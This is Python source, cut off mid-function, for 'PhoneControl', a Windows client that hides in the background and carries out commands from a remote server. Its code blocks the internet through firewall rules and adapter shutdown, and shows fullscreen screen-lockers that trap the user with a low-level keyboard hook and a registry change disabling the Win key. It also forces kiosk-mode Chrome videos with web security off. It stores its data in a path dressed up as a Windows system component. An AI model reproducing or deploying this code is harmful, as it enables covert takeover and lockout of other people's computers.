"""
PhoneControl — Windows client
Polls the server and executes commands locally.
Runs as a hidden background process (no window, no tray).
"""

import sys
import os
import threading
import time
import uuid
import json
import logging
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import mimetypes
import tkinter as tk
from tkinter import filedialog
import ctypes
import ctypes.wintypes
from pathlib import Path

# ─── Config ──────────────────────────────────────────────────────────────────

SERVER_URL    = os.environ.get("PC_SERVER_URL",    "https://phonecontrol-2tkw.onrender.com")
DEVICE_SECRET = os.environ.get("PC_DEVICE_SECRET", "mysecret42")
POLL_INTERVAL_IDLE   = 30   # seconds when inactive
POLL_INTERVAL_ACTIVE = 10   # seconds when active

# ─── Logging (to file next to exe) ───────────────────────────────────────────

BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
# Лог всегда рядом с exe — работает и при установке и после
LOG_FILE  = BASE_DIR / "phonecontrol.log"

logging.basicConfig(
    filename=str(LOG_FILE),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("pc")

# ─── Device ID (persistent) ──────────────────────────────────────────────────

# После установки данные хранятся в INSTALL_DIR, до — рядом с exe
_DATA_DIR  = Path(os.environ.get("APPDATA","")) / "Microsoft" / "Windows" / "Themes" / "WinDWM"
DATA_DIR   = _DATA_DIR if (_DATA_DIR / "dwm_service.exe").exists() else BASE_DIR
PREFS_FILE = DATA_DIR / "phonecontrol_prefs.json"

def get_device_id() -> str:
    prefs = {}
    if PREFS_FILE.exists():
        try:
            prefs = json.loads(PREFS_FILE.read_text())
        except Exception:
            pass
    if "device_id" not in prefs:
        prefs["device_id"] = uuid.uuid4().hex[:16]
        PREFS_FILE.write_text(json.dumps(prefs))
    return prefs["device_id"]

DEVICE_ID = get_device_id()

# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def _headers(extra: dict = None) -> dict:
    h = {
        "X-Device-Secret": DEVICE_SECRET,
        "X-Device-Id":     DEVICE_ID,
        "X-Device-Model":  "Windows PC",
    }
    if extra:
        h.update(extra)
    return h

def http_get(path: str) -> dict:
    url = SERVER_URL + path
    req = urllib.request.Request(url, headers=_headers())
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def http_post_json(path: str, data: dict) -> dict:
    url     = SERVER_URL + path
    payload = json.dumps(data).encode()
    req     = urllib.request.Request(
        url, data=payload,
        headers={**_headers(), "Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def http_post_multipart(path: str, filepath: str, chat_id: str, caption: str = "") -> dict:
    """Upload a file to /upload via multipart/form-data."""
    import email.generator, io, email.mime.multipart, email.mime.base
    boundary = uuid.uuid4().hex
    filename  = os.path.basename(filepath)
    mime_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"

    with open(filepath, "rb") as f:
        file_data = f.read()

    body  = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: {mime_type}\r\n\r\n"
    ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()

    url = SERVER_URL + path
    req = urllib.request.Request(
        url, data=body,
        headers={
            **_headers({
                "X-Chat-Id": chat_id,
                "X-Caption":  urllib.parse.quote(caption or filename),
            }),
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=120) as r:
        return json.loads(r.read())

def send_text_reply(chat_id: str, text: str):
    try:
        http_post_json("/text_reply", {
            "chat_id":   chat_id,
            "text":      text,
            "device_id": DEVICE_ID,
        })
    except Exception as e:
        log.error(f"send_text_reply: {e}")

# ─── Wi-Fi control ────────────────────────────────────────────────────────────

FIREWALL_RULE_NAME = "PhoneControlBlock"

def wifi_disable():
    """Блокирует весь интернет через Windows Firewall + отключает адаптеры."""
    try:
        # 1. Firewall — блокируем весь исходящий трафик
        subprocess.run([
            "netsh", "advfirewall", "firewall", "add", "rule",
            f"name={FIREWALL_RULE_NAME}",
            "dir=out", "action=block", "protocol=any",
            "remoteip=0.0.0.0/0", "enable=yes"
        ], capture_output=True, timeout=10)

        # 2. Дополнительно отключаем все сетевые адаптеры
        result = subprocess.run(
            ["netsh", "interface", "show", "interface"],
            capture_output=True, timeout=10
        )
        output = result.stdout.decode('utf-8', errors='ignore') or \
                 result.stdout.decode('cp1251', errors='ignore')
        adapters = []
        for line in output.splitlines():
            if "Подключен" in line or "Connected" in line or "Enabled" in line:
                parts = line.split()
                if len(parts) >= 4:
                    adapter = " ".join(parts[3:])
                    adapters.append(adapter)
                    subprocess.run([
                        "netsh", "interface", "set", "interface", adapter, "disable"
                    ], capture_output=True, timeout=10)

        log.info(f"Internet blocked via firewall + adapters: {adapters}")
        return adapters
    except Exception as e:
        log.error(f"wifi_disable: {e}")
        return []

def wifi_enable(adapter=None):
    """Снимает блокировку интернета."""
    try:
        # 1. Удаляем firewall правило
        subprocess.run([
            "netsh", "advfirewall", "firewall", "delete", "rule",
            f"name={FIREWALL_RULE_NAME}"
        ], capture_output=True, timeout=10)

        # 2. Включаем все адаптеры обратно
        result = subprocess.run(
            ["netsh", "interface", "show", "interface"],
            capture_output=True, timeout=10
        )
        output = result.stdout.decode('utf-8', errors='ignore') or \
                 result.stdout.decode('cp1251', errors='ignore')
        for line in output.splitlines():
            if "Отключен" in line or "Disabled" in line:
                parts = line.split()
                if len(parts) >= 4:
                    adapter = " ".join(parts[3:])
                    subprocess.run([
                        "netsh", "interface", "set", "interface", adapter, "enable"
                    ], capture_output=True, timeout=10)

        log.info("Internet unblocked")
    except Exception as e:
        log.error(f"wifi_enable: {e}")

# ─── Lock screen ──────────────────────────────────────────────────────────────

def lock_screen():
    try:
        ctypes.windll.user32.LockWorkStation()
    except Exception as e:
        log.error(f"lock_screen: {e}")

# ─── Volume control ───────────────────────────────────────────────────────────

def set_volume(level: int):
    """level 0-10 → 0.0-1.0 via pycaw or nircmd fallback."""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        scalar = max(0.0, min(1.0, level / 10.0))
        volume.SetMasterVolumeLevelScalar(scalar, None)
        log.info(f"Volume set to {level}/10")
    except Exception as e:
        log.warning(f"pycaw failed ({e}), trying nircmd")
        try:
            # nircmd.exe if available
            vol_raw = int(level / 10 * 65535)
            subprocess.run(["nircmd.exe", "setsysvolume", str(vol_raw)], timeout=5)
        except Exception as e2:
            log.error(f"set_volume fallback failed: {e2}")

# ─── Winlocker base ───────────────────────────────────────────────────────────

def make_fullscreen_root(bg: str = "#1a1a2e") -> tk.Tk:
    """Create a topmost fullscreen window that blocks Alt+F4 and other keys."""
    root = tk.Tk()
    root.configure(bg=bg)
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    # Block Alt+F4
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    # Block Alt+Tab, Win key via low-level — best effort
    root.bind("<Alt-F4>",    lambda e: "break")
    root.bind("<Alt-Tab>",   lambda e: "break")
    root.bind("<Escape>",    lambda e: "break")
    root.focus_force()
    return root

def keep_on_top(root: tk.Tk, stop_event: threading.Event,
                focus_widget=None):
    while not stop_event.is_set():
        time.sleep(1.5)
        if stop_event.is_set():
            break
        try:
            if not root.winfo_exists():
                break
            root.attributes("-topmost", True)
            root.lift()
            if focus_widget:
                if focus_widget.winfo_exists():
                    focus_widget.focus_set()
            else:
                root.focus_force()
        except Exception:
            break

# ─── MSG overlay ─────────────────────────────────────────────────────────────

def show_message_overlay(text: str, fb_mode: str, reply_prompt: str,
                          survey: list, chat_id: str):
    """
    plain  → text + OK button (closes on OK)
    reply  → text + input + Send (winlocker until sent)
    survey → questions one by one + Send (winlocker until done)
    """
    stop_event = threading.Event()
    answers    = []
    q_index    = [0]

    root = make_fullscreen_root("#1a1a2e")

    # ── Layout ────────────────────────────────────────────────────────────────
    outer = tk.Frame(root, bg="#1a1a2e")
    outer.place(relx=0.5, rely=0.5, anchor="center")

    card = tk.Frame(outer, bg="#16213e", padx=40, pady=40,
                    relief="flat", bd=0)
    card.pack()

    msg_var = tk.StringVar(value=text)
    msg_lbl = tk.Label(card, textvariable=msg_var, bg="#16213e", fg="white",
                       font=("Segoe UI", 18), wraplength=700, justify="center")
    msg_lbl.pack(pady=(0, 20))

    input_frame = tk.Frame(card, bg="#16213e")
    entry       = tk.Entry(input_frame, font=("Segoe UI", 14), width=40,
                           bg="#0f3460", fg="white", insertbackground="white",
                           relief="flat", bd=8)

    prompt_lbl = tk.Label(card, text="", bg="#16213e", fg="#a0a0c0",
                           font=("Segoe UI", 12))

    btn_text = tk.StringVar(value="ОК")
    btn = tk.Button(card, textvariable=btn_text, font=("Segoe UI", 14, "bold"),
                    bg="#e94560", fg="white", activebackground="#c73652",
                    activeforeground="white", relief="flat", padx=30, pady=12,
                    cursor="hand2")
    btn.pack(pady=(10, 0))

    # keep_on_top стартует ПОСЛЕ того как определён entry
    # для reply/survey передаём entry чтобы фокус не прерывал ввод
    focus_target = None  # будет переопределён ниже для reply/survey

    def do_plain_ok():
        stop_event.set()
        root.after(0, root.destroy)

    def do_send():
        answer = entry.get().strip()
        if not answer:
            return
        answers.append(answer)
        entry.delete(0, tk.END)

        if fb_mode == "survey" and q_index[0] < len(survey) - 1:
            q_index[0] += 1
            msg_var.set(survey[q_index[0]])
            prompt_lbl.config(text=f"Вопрос {q_index[0]+1}/{len(survey)}")
        else:
            result_text = "\n".join(
                f"Q: {survey[i]}\nA: {answers[i]}"
                for i in range(len(answers))
            ) if fb_mode == "survey" else answers[0]
            prompt_lbl.config(text="📤 Отправляю...")
            entry.config(state="disabled")
            def _send_and_close():
                send_text_reply(chat_id, result_text)
                stop_event.set()
                root.after(0, root.destroy)
            threading.Thread(target=_send_and_close, daemon=True).start()

    # ── Configure by mode ─────────────────────────────────────────────────────
    if fb_mode == "plain":
        btn.config(command=do_plain_ok)

    elif fb_mode == "reply":
        prompt_lbl.config(text=reply_prompt)
        prompt_lbl.pack(pady=(0, 6))
        input_frame.pack(pady=(0, 10))
        entry.pack()
        entry.focus()
        btn_text.set("Отправить")
        btn.config(command=do_send)
        entry.bind("<Return>", lambda e: do_send())
        focus_target = entry   # keep_on_top будет возвращать фокус на entry

    elif fb_mode == "survey":
        if survey:
            msg_var.set(survey[0])
            prompt_lbl.config(text=f"Вопрос 1/{len(survey)}")
            prompt_lbl.pack(pady=(0, 6))
            input_frame.pack(pady=(0, 10))
            entry.pack()
            entry.focus()
            btn_text.set("Далее")
            btn.config(command=do_send)
            entry.bind("<Return>", lambda e: do_send())
            focus_target = entry
        else:
            btn.config(command=do_plain_ok)

    # Запускаем keep_on_top только теперь — когда focus_target известен
    threading.Thread(
        target=keep_on_top, args=(root, stop_event, focus_target), daemon=True
    ).start()

    root.mainloop()

# ─── Video overlay ────────────────────────────────────────────────────────────

from PIL import Image, ImageTk

# Global reference so /unbanvideo can close it
_video_window = None
_video_stop   = threading.Event()

# ── Chrome-based video player ────────────────────────────────────────────────

_chrome_proc    = None
_kbd_hook       = None
_video_stop     = threading.Event()
_video_window   = None  # tkinter overlay для кнопок поверх Chrome

def _block_alttab(enable: bool):
    """Устанавливает/снимает low-level keyboard hook, блокирующий все способы выйти из Chrome."""
    import ctypes
    import ctypes.wintypes

    WH_KEYBOARD_LL = 13
    WM_KEYDOWN     = 0x0100
    WM_SYSKEYDOWN  = 0x0104
    WM_KEYUP       = 0x0101
    WM_SYSKEYUP    = 0x0105

    # Виртуальные коды клавиш
    VK_TAB         = 0x09
    VK_ESCAPE      = 0x1B
    VK_F4          = 0x73
    VK_F11         = 0x7A
    VK_LWIN        = 0x5B
    VK_RWIN        = 0x5C
    VK_D           = 0x44   # Win+D (свернуть всё)
    VK_T           = 0x54   # Ctrl+T (новая вкладка)
    VK_W           = 0x57   # Ctrl+W (закрыть вкладку)
    VK_N           = 0x4E   # Ctrl+N (новое окно)
    VK_L           = 0x4C   # Ctrl+L (адресная строка)
    VK_F           = 0x46   # Ctrl+F (поиск)

    # Полный список блокируемых VK
    BLOCKED_VK = {VK_TAB, VK_ESCAPE, VK_F4, VK_F11,
                  VK_LWIN, VK_RWIN,
                  VK_D, VK_T, VK_W, VK_N, VK_L, VK_F}

    global _kbd_hook
    user32 = ctypes.windll.user32

    if not enable:
        if _kbd_hook:
            user32.UnhookWindowsHookEx(_kbd_hook)
            _kbd_hook = None
        return

    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

    def hook_proc(nCode, wParam, lParam):
        if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN, WM_KEYUP, WM_SYSKEYUP):
            vk = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))[0]
            if vk in BLOCKED_VK:
                return 1  # блокируем — не передаём дальше
        return user32.CallNextHookEx(None, nCode, wParam, lParam)

    _hook_fn = HOOKPROC(hook_proc)
    _kbd_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_fn, None, 0)
    # Держим ссылку чтобы GC не удалил
    _block_alttab._fn = _hook_fn

    # Дополнительно: отключаем кнопку Win через реестр (TaskbarNoWinKey)
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        # Применяем немедленно
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x001A, 0, "Policy")
    except Exception as e:
        log.warning(f"Registry WinKey block failed: {e}")

    log.info(f"Keyboard hook set: {_kbd_hook}")


def _find_chrome() -> str:
    """Ищет путь к Chrome."""
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return "chrome.exe"  # fallback — если в PATH


def _make_video_html(video_path: str, duration: int = 0) -> str:
    """Создаёт временный HTML файл с видео-плеером."""
    import tempfile
    file_url = "file:///" + video_path.replace(chr(92), "/")
    # duration=0 означает бесконечно (закрывается только через /unbanvideo)
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  html, body {{ background: #000; width: 100vw; height: 100vh; overflow: hidden; }}
  video {{ width: 100%; height: 100%; object-fit: contain; display: block; }}
  #timer {{
    position: fixed; bottom: 18px; left: 50%; transform: translateX(-50%);
    color: rgba(255,255,255,0.55); font: 16px/1 'Segoe UI', sans-serif;
    background: rgba(0,0,0,0.45); padding: 6px 18px; border-radius: 20px;
    pointer-events: none; display: none;
  }}
</style>
</head>
<body>
<video id="v" loop playsinline>
  <source src="{file_url}" type="video/mp4">
</video>
<div id="timer"></div>
<script>
  // ── Блокируем закрытие вкладки / навигацию назад ──
  window.addEventListener('beforeunload', function(e) {{
    e.preventDefault();
    e.returnValue = '';
    return '';
  }});
  history.pushState(null, '', location.href);
  window.addEventListener('popstate', function() {{
    history.pushState(null, '', location.href);
  }});

  // ── Автовоспроизведение со звуком ──
  var v = document.getElementById('v');
  v.volume = 1.0;
  var playPromise = v.play();
  if (playPromise !== undefined) {{
    playPromise.catch(function() {{
      // Если браузер заблокировал — пробуем через user interaction fallback
      document.addEventListener('click', function() {{ v.play(); }}, {{ once: true }});
      // Либо muted-старт → потом unmute
      v.muted = true;
      v.play().then(function() {{
        v.muted = false;
      }});
    }});
  }}

  // ── Таймер (если duration > 0) ──
  var duration = {duration};
  if (duration > 0) {{
    var timerEl = document.getElementById('timer');
    timerEl.style.display = 'block';
    var remaining = duration;
    timerEl.textContent = remaining + ' сек';
    var iv = setInterval(function() {{
      remaining--;
      if (remaining <= 0) {{
        clearInterval(iv);
        timerEl.textContent = '';
        timerEl.style.display = 'none';
      }} else {{
        timerEl.textContent = remaining + ' сек';
      }}
    }}, 1000);
  }}
</script>
</body>
</html>"""
    tmp = tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode='w', encoding='utf-8')
    tmp.write(html)
    tmp.close()
    return tmp.name


def show_video_overlay(video_path: str, lock: bool, duration: int,
                        fb_mode: str, reply_prompt: str, survey: list,
                        chat_id: str):
    global _chrome_proc, _video_stop, _video_window

    _video_stop = threading.Event()
    stop_event  = _video_stop

    # Создаём HTML страницу с видео
    html_path = _make_video_html(video_path, duration)

    # Запускаем Chrome в киоск-режиме
    chrome = _find_chrome()
    _chrome_proc = subprocess.Popen([
        chrome,
        "--kiosk",
        "--no-first-run",
        "--disable-infobars",
        "--autoplay-policy=no-user-gesture-required",
        "--allow-file-access-from-files",
        "--disable-web-security",
        "--disable-features=AutoupgradeMixedContent",
        "--disable-popup-blocking",
        "--start-maximized",
        f"file:///{html_path.replace(chr(92), chr(47))}",
    ])
    log.info(f"Chrome started for video: {video_path}")

    # Блокируем Alt+Tab если lock=True
    if lock:
        _block_alttab(True)

    answers  = []
    q_index  = [0]

    # Создаём прозрачное поверх Chrome окно с кнопками
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.attributes("-alpha", 0.0)  # полностью прозрачное
    root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
    root.configure(bg="black")
    _video_window = root

    # Нижняя панель с кнопками — непрозрачная
    bottom = tk.Frame(root, bg="#111111")
    bottom.place(relx=0, rely=1.0, anchor="sw", relwidth=1.0)
    root.attributes("-alpha", 1.0)
    # Делаем окно прозрачным кроме нижней панели через layered window
    # Используем цветовой ключ для прозрачности
    root.attributes("-transparentcolor", "black")

    status_lbl = tk.Label(bottom, text="", bg="#111111", fg="#888",
                           font=("Segoe UI", 12))
    status_lbl.pack(pady=(8, 0))

    input_frame = tk.Frame(bottom, bg="#111111")
    entry       = tk.Entry(input_frame, font=("Segoe UI", 13), width=50,
                           bg="#222", fg="white", insertbackground="white",
                           relief="flat", bd=8)
    send_btn    = tk.Button(input_frame, text="Отправить",
                            font=("Segoe UI", 12, "bold"),
                            bg="#e94560", fg="white", relief="flat",
                            padx=20, pady=8, cursor="hand2")
    close_btn   = tk.Button(bottom, text="✕  Закрыть",
                            font=("Segoe UI", 12),
                            bg="#333", fg="white", relief="flat",
                            padx=20, pady=8, cursor="hand2")

    def do_close():
        stop_event.set()
        _block_alttab(False)
        # Восстанавливаем Win-клавишу в реестре
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except Exception:
            pass
        if _chrome_proc:
            try:
                _chrome_proc.terminate()
            except Exception:
                pass
        try:
            os.unlink(html_path)
        except Exception:
            pass
        global _video_window
        _video_window = None
        root.after(0, root.destroy)

    def do_send():
        answer = entry.get().strip()
        if not answer:
            return
        answers.append(answer)
        entry.delete(0, tk.END)
        if fb_mode == "survey" and q_index[0] < len(survey) - 1:
            q_index[0] += 1
            status_lbl.config(text=f"{survey[q_index[0]]}  ({q_index[0]+1}/{len(survey)})")
        else:
            result = "\n".join(
                f"Q: {survey[i]}\nA: {answers[i]}" for i in range(len(answers))
            ) if fb_mode == "survey" else answers[0]
            status_lbl.config(text="📤 Отправляю...")
            send_btn.config(state="disabled")
            def _send_and_close():
                send_text_reply(chat_id, result)
                root.after(0, do_close)
            threading.Thread(target=_send_and_close, daemon=True).start()

    send_btn.config(command=do_send)
    close_btn.config(command=do_close)

    def unlock_ui():
        status_lbl.config(text="")
        if fb_mode == "reply":
            status_lbl.config(text=reply_prompt)
            entry.pack(side="left", padx=(0, 10))
            send_btn.pack(side="left")
            input_frame.pack(pady=(0, 10))
            entry.focus_set()
        elif fb_mode == "survey" and survey:
            status_lbl.config(text=f"{survey[0]}  (1/{len(survey)})")
            entry.pack(side="left", padx=(0, 10))
            send_btn.pack(side="left")
            input_frame.pack(pady=(0, 10))
            entry.focus_set()
        else:
            close_btn.pack(pady=(0, 10))

    # keep on top
    def _keep_on_top():
        while not stop_event.is_set():
            time.sleep(2)
            if stop_event.is_set():
                break
            try:
                if root.winfo_exists():
                    root.attributes("-topmost", True)
                    root.lift()
            except Exception:
                break
    threading.Thread(target=_keep_on_top, daemon=True).start()

    # Таймер
    if duration > 0:
        def countdown():
            time.sleep(1)
            for remaining in range(duration, 0, -1):
                if stop_event.is_set():
                    return
                try:
                    root.after(0, lambda r=remaining: status_lbl.config(
                        text=f"⏱ Осталось: {r} сек"))
                except Exception:
                    return
                time.sleep(1)
            if not stop_event.is_set():
                root.after(0, unlock_ui)
        threading.Thread(target=countdown, daemon=True).start()
    else:
        if not lock:
            root.after(500, unlock_ui)

    root.mainloop()


def unban_video():
    global _video_window
    if _video_window:
        try:
            _video_stop.set()
            _block_alttab(False)
            # Восстанавливаем Win-клавишу
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                                     0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
            except Exception:
                pass
            if _chrome_proc:
                _chrome_proc.terminate()
            _video_window.after(0, _video_window.destroy)
            _video_window = None
        except Exception as e:
            log.error(f"unban_video: {e}")

# ─── File picker ─────────────────────────────────────────────────────────────


def open_file_picker(chat_id: str):
    """Open file dialog and upload selected file to server."""
    def _pick():
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        filepath = filedialog.askopenfilename(
            title="Выбери файл для отправки",
            filetypes=[
                ("Все файлы", "*.*"),
                ("Изображения", "*.jpg *.jpeg *.png *.gif *.webp *.bmp"),
                ("Видео",       "*.mp4 *.mov *.avi *.mkv *.3gp"),
            ]
        )
        root.destroy()
        if filepath:
            try:
                http_post_multipart("/upload", filepath, chat_id)
                log.info(f"File uploaded: {filepath}")
            except Exception as e:
                log.error(f"File upload failed: {e}")
    threading.Thread(target=_pick, daemon=True).start()

# ─── Ban state ────────────────────────────────────────────────────────────────

class BanState:
    def __init__(self):
        self.active      = False
        self.adapter     = "Wi-Fi"
        self.password    = None   # None = no password required
        self.timer       = None   # threading.Timer for auto-unban
        self._lock       = threading.Lock()
        # Winlocker window for password-ban
        self._pw_root: tk.Tk = None
        self._pw_stop        = threading.Event()

    def ban(self, password: str | None):
        with self._lock:
            if self.active:
                return
            self.active   = True
            self.password = password
            self.adapter  = wifi_disable()
            # Сохраняем состояние на диск
            try:
                PREFS_FILE.write_text(json.dumps({
                    **json.loads(PREFS_FILE.read_text() if PREFS_FILE.exists() else "{}"),
                    "ban_active": True
                }))
            except Exception:
                pass

            if password:
                self.timer = threading.Timer(300, self._auto_unban)
                self.timer.start()
                ui_call(self._show_pw_screen)
            else:
                self.timer = threading.Timer(300, self._auto_unban)
                self.timer.start()

    def unban(self):
        with self._lock:
            if not self.active:
                return
            self.active   = False
            self.password = None
            if self.timer:
                self.timer.cancel()
                self.timer = None
            wifi_enable(self.adapter)
            self._close_pw_screen()
            # Сбрасываем состояние на диске
            try:
                PREFS_FILE.write_text(json.dumps({
                    **json.loads(PREFS_FILE.read_text() if PREFS_FILE.exists() else "{}"),
                    "ban_active": False
                }))
            except Exception:
                pass

    def _auto_unban(self):
        log.info("Auto-unban triggered")
        self.unban()

    def try_password(self, entered: str) -> bool:
        if self.password and entered == self.password:
            self.unban()
            return True
        return False

    def _show_pw_screen(self):
        self._pw_stop = threading.Event()
        root = make_fullscreen_root("#1a1a2e")
        self._pw_root = root

        card = tk.Frame(root, bg="#16213e", padx=50, pady=50)
        card.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(card, text="🔒  Интернет заблокирован", bg="#16213e",
                 fg="white", font=("Segoe UI", 20, "bold")).pack(pady=(0, 20))
        tk.Label(card, text="Введи пароль для разблокировки:",
                 bg="#16213e", fg="#a0a0c0", font=("Segoe UI", 13)).pack(pady=(0, 10))

        entry = tk.Entry(card, font=("Segoe UI", 14), width=30,
                         bg="#0f3460", fg="white", insertbackground="white",
                         relief="flat", bd=8, show="•")
        entry.pack(pady=(0, 10))
        entry.focus()

        err_lbl = tk.Label(card, text="", bg="#16213e", fg="#e94560",
                           font=("Segoe UI", 12))
        err_lbl.pack()

        def attempt():
            if self.try_password(entry.get()):
                pass  # unban() closes screen via _close_pw_screen
            else:
                entry.delete(0, tk.END)
                err_lbl.config(text="❌ Неверный пароль")

        btn = tk.Button(card, text="Разблокировать",
                        font=("Segoe UI", 13, "bold"),
                        bg="#e94560", fg="white", relief="flat",
                        padx=25, pady=10, cursor="hand2", command=attempt)
        btn.pack(pady=(10, 0))
        entry.bind("<Return>", lambda e: attempt())

        # keep_on_top с фокусом на entry — не прерывает ввод пароля
        threading.Thread(
            target=keep_on_top, args=(root, self._pw_stop, entry), daemon=True
        ).start()

        root.mainloop()

    def _close_pw_screen(self):
        if self._pw_root:
            try:
                self._pw_stop.set()
                self._pw_root.after(0, self._pw_root.destroy)
                self._pw_root = None
            except Exception:
                pass


ban_state = BanState()

# Если бан был активен до перезапуска — восстанавливаем
try:
    _prefs = json.loads(PREFS_FILE.read_text()) if PREFS_FILE.exists() else {}
    if _prefs.get("ban_active"):
        ban_state.active = True
        log.info("Ban state restored from disk")
except Exception:
    pass

# ─── Video cache ──────────────────────────────────────────────────────────────

CACHE_DIR = DATA_DIR / "video_cache"
CACHE_DIR.mkdir(exist_ok=True)

BUILTIN_VIDEO_DIR = BASE_DIR / "assets"  # assets всегда рядом с exe
RAW_VIDEO_DIR = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Themes" / "WinDWM" / "assets"

def get_raw_videos() -> list:
    """Возвращает список raw-видео из assets в порядке raw1, raw2..."""
    result = []
    if not RAW_VIDEO_DIR.exists():
        return result
    files = sorted(
        [f for f in RAW_VIDEO_DIR.iterdir()
         if f.suffix.lower() in ('.mp4', '.mov', '.avi', '.mkv') and f.stem.startswith('raw')],
        key=lambda f: int(''.join(filter(str.isdigit, f.stem)) or 0)
    )
    for i, f in enumerate(files, 1):
        result.append({"name": f"raw{i}", "filename": f.name, "path": str(f)})
    return result

def next_raw_name() -> str:
    """Возвращает следующее имя raw-файла (raw1, raw2...)."""
    existing = get_raw_videos()
    return f"raw{len(existing) + 1}"

def send_video_list(chat_id: str):
    """Отправляет список raw-видео на сервер."""
    videos = get_raw_videos()
    http_post_json("/video_list", {
        "chat_id": chat_id,
        "device_id": DEVICE_ID,
        "videos": videos,
    })

def prefetch_video(url: str, chat_id: str = ""):
    """Скачивает видео в assets с именем rawN."""
    RAW_VIDEO_DIR.mkdir(exist_ok=True)
    name = next_raw_name()
    dest = RAW_VIDEO_DIR / f"{name}.mp4"
    try:
        log.info(f"Downloading {url} → {dest}")
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=120) as r, open(dest, "wb") as f:
            while chunk := r.read(8192):
                f.write(chunk)
        log.info(f"Downloaded: {dest}")
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id,
                "text": f"✅ Видео сохранено как *{name}* — воспроизведи через /raw {name[3:]}",
                "device_id": DEVICE_ID,
            })
    except Exception as e:
        log.error(f"prefetch_video: {e}")
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id,
                "text": f"⚠️ Ошибка скачивания: {e}",
                "device_id": DEVICE_ID,
            })

def delete_raw_video(num: int, chat_id: str = ""):
    """Удаляет raw-видео по номеру."""
    videos = get_raw_videos()
    if num < 1 or num > len(videos):
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id,
                "text": f"⚠️ Нет видео raw{num}",
                "device_id": DEVICE_ID,
            })
        return
    path = Path(videos[num - 1]["path"])
    if path.exists():
        path.unlink()
        log.info(f"Deleted: {path}")
    # Переименовываем оставшиеся чтобы не было дырок
    remaining = get_raw_videos()
    for i, v in enumerate(remaining, 1):
        old = Path(v["path"])
        new = RAW_VIDEO_DIR / f"raw{i}.mp4"
        if old != new:
            old.rename(new)
    if chat_id:
        http_post_json("/text_reply", {
            "chat_id": chat_id,
            "text": f"🗑 raw{num} удалён. Номера обновлены.",
            "device_id": DEVICE_ID,
        })

# ─── Command handler ─────────────────────────────────────────────────────────

def handle_command(cmd: dict):
    name     = cmd.get("cmd", "")
    chat_id  = cmd.get("_chat_id", "")
    lock     = cmd.get("lock", False)
    duration = cmd.get("duration", 0)
    fb_mode  = cmd.get("fb_mode", "plain")
    rp       = cmd.get("reply_prompt", "✏️ Напиши ответ:")
    survey   = cmd.get("survey", [])

    log.info(f"Command: {name}")

    if name == "shutdown":
        lock_screen()

    elif name == "ban":
        password = cmd.get("password") or None
        ban_state.ban(password)

    elif name == "unban":
        ban_state.unban()

    elif name == "sound":
        # pycaw может блокировать — запускаем в отдельном потоке
        threading.Thread(
            target=set_volume, args=(cmd.get("level", 5),), daemon=True
        ).start()

    elif name == "show_message":
        text = cmd.get("text", "")
        ui_call("show_message_overlay", text, fb_mode, rp, survey, chat_id)

    elif name == "video":
        num  = cmd.get("num", 1)
